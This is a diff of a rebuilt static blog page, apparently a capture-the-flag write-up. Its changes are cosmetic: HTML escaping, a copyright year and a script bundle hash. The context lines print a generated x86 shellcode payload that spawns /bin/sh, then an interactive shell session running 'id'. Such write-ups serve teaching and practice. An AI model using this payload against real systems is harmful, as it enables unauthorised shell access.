-[+] Generated shellcode: b'AAAAAAAAAAAAAAAAAAAAD\xa7\xcf\xff1\xc0\x83\xc0\x0b1\xc91\xd21\xf6h/sh\x00h/bin\x89\xe3\xcd\x80h\x9d\x80\x04\x08\xc3'
+[+] Generated shellcode: b&#39;AAAAAAAAAAAAAAAAAAAAD\xa7\xcf\xff1\xc0\x83\xc0\x0b1\xc91\xd21\xf6h/sh\x00h/bin\x89\xe3\xcd\x80h\x9d\x80\x04\x08\xc3&#39;
 [*] Switching to interactive mode
 $ id
 uid=1000(start) gid=1000(start) groups=1000(start)
@@ -283,7 +276,7 @@ start
                 <footer class="footer">
     <div class="footer__inner">
         <div class="footer__content">
-            <span>&copy; 2021</span>
+            <span>&copy; 2022</span>
             
             <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
             <span> <a href="http://foxmaccloud.com/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
@@ -304,8 +297,7 @@ start
 
 
 
-
-<script type="text/javascript" src="/bundle.min.dc716e9092c9820b77f96da294d0120aeeb189b5bcea9752309ebea27fd53bbe6b13cffb2aca8ecf32525647ceb7001f76091de4199ac5a3caa432c070247f5b.js" integrity="sha512-3HFukJLJggt3&#43;W2ilNASCu6xibW86pdSMJ6&#43;on/VO75rE8/7KsqOzzJSVkfOtwAfdgkd5BmaxaPKpDLAcCR/Ww=="></script>
+<script type="text/javascript" src="/bundle.min.feebdc8d801e3fb1791305e362b6d11557f029604dd5b3c27e2686bc88787ee90ae1ccf0afe81bd7d959d7617cfe1fc73062aa82b4e1fa830d6941193d2cbddf.js" integrity="sha512-/uvcjYAeP7F5EwXjYrbRFVfwKWBN1bPCfiaGvIh4fukK4czwr&#43;gb19lZ12F8/h/HMGKqgrTh&#43;oMNaUEZPSy93w=="></script>
 
 
 
